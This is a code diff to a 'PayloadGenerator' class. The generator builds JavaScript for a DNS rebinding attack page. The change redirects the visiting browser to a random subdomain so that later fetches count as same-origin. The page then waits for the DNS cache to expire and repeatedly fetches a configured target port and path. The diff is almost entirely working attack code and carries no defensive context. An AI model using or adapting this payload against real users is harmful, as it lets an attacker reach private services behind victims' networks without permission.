@@ -114,7 +114,17 @@ class PayloadGenerator:
         attemptIntervalMs: 1000
     }};
     
+    // Check if we need to redirect to unique subdomain for same-origin fetch
     const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
+    const currentHost = window.location.hostname;
+    
+    // If we're not on a random subdomain yet, redirect to one
+    if (!currentHost.startsWith('r') || currentHost.split('.').length < 3) {{
+        const uniqueHost = 'r' + Math.random().toString(36).slice(2, 10) + '.' + baseDomain;
+        const newUrl = 'http://' + uniqueHost + ':' + window.location.port + window.location.pathname + window.location.search;
+        window.location.href = newUrl;
+        throw new Error('Redirecting...');
+    }}
     
     const status = document.getElementById('status');
     const log = document.getElementById('log');
@@ -131,9 +141,8 @@ class PayloadGenerator:
     }}
     
     async function tryRebind(attempt) {{
-        // Fresh subdomain each attempt to bypass DNS cache
-        const uniqueHost = 'r' + Math.random().toString(36).slice(2) + '.' + baseDomain;
-        const targetUrl = 'http://' + uniqueHost + ':' + CONFIG.targetPort + CONFIG.targetPath;
+        // Use current hostname (already unique from redirect) for same-origin
+        const targetUrl = 'http://' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath;
         addLog('Attempt ' + attempt + ': Fetching ' + targetUrl);
         
         try {{
@@ -173,7 +182,7 @@ class PayloadGenerator:
     
     async function main() {{
         setStatus('⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for DNS TTL to expire...', 'waiting');
-        addLog('Target: ' + targetUrl);
+        addLog('Target: ' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath);
         addLog('Waiting ' + CONFIG.delayMs + 'ms for DNS cache to expire...');
         
         await new Promise(r => setTimeout(r, CONFIG.delayMs));
